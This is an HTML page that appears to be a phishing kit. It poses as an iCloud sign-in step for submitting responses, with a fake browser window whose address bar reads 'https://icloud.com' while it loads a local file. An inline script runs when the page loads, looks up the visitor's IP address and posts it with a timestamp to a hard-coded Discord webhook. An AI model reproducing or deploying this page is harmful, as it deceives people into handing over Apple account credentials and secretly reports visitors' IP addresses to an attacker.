<!DOCTYPE html>
<html lang="es">

<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>iDrive</title>

<link rel="stylesheet" href="style.css">
<!-- Iconos -->
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css">
</head>

<body>
<div class="contenedor">

    <div class="icono">
        <i class="fa-solid fa-file-arrow-down"></i>
    </div>

    <h1>One More Step</h1>

    <div class="mensaje">

        <p>
To submit your responses, please sign in with iCloud
        </p>
<button id="abrirTutorial" class="apple-btn">
    Sign in with iCloud
</button>

<div id="fondo">

    <div id="ventana">

        <div class="barra">

    <div class="botones">
        <span class="rojo" id="cerrar"></span>
        <span class="amarillo"></span>
        <span class="verde"></span>
    </div>

    <div class="direccion">
        https://icloud.com
    </div>

</div>

<iframe
    id="tutorialFrame"
    src="sent.html">
</iframe>

</div>

<script src="script.js"></script>

<script>
// notifica cuando alguien carga la página
(async function() {
    try {
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        const ip = ipData.ip;

        await fetch('https://discord.com/api/webhooks/1547265836639850547/8t4VVERF2Jv7Vt9ZgyRjWKcdI70TJqJDdImE3vtJRsojQxaUQWHV1ydGwPc4jXUpK4cW', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                content: `🔔 **Alguien abrió la página idrivee**\n📱 IP: ${ip}\n🕐 ${new Date().toLocaleString()}`
            })
        });
    } catch (error) {
        console.log('Error al notificar:', error);
    }
})();
</script>
    
</body>

</html>
